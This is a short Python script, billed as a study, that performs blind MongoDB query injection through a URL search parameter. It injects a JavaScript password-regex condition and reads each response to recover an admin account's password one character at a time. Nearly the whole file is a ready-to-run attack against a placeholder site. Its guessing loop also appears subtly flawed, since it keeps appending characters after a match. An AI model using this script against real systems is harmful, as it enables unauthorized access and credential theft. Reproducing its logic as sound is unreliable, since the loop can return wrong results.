#!/usr/bin/env python3
# Usage: ./pwdguessr.py
# Study of MongoDB query injection via url parameter
import requests
import sys
import urllib.parse
import re

# case: using mongodb query parameter injection to guess a column (for this example the 'password' column) value one character at a time
# example url and query parameter: https://example.domain.tdlthing/?search=admin

URL='https://example.domain.tdlthing'
PARAM='/?search='

# function to GET page content
def get_content(url):
    try:
        s = requests.Session()
        r = requests.Request(method='GET', url=url)
        prep = r.prepare()
        prep.url = url
        response = s.send(prep)
        s.close()
        return response.content
    except:
        return 'problem getting content'


# function to search requested page content for successful query
def process_content(content):
    search = re.search('search=admin', str(content), re.IGNORECASE)
    if search:
        return 'match found'
    else:
        return 'no match found'


# given the possible characters and the password format
alphabet = '0123456789abcdef'
passwd = 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'
# establish somewhere to keep the discovered password
pwd = ''

# cycle through each character of the password 
for position in passwd:
    if position != '-':
        for character in alphabet:
            # append character to test password
            pwd+=character
            # construct query value
            QUERY=urllib.parse.quote("admin' && this.password.match(/^"+pwd+".*$/)")+'%00'
            # test query
            if process_content(get_content(URL+PARAM+QUERY)) == 'match found':
                progress = len(pwd) / len(passwd)
                print('password progress: ' + str(int(progress*100))+'%')
                pass
            # remove failed character test
            else:
                pwd=pwd[:-1]
    # append dash to test password
    else:
        pwd+='-'

print(pwd)






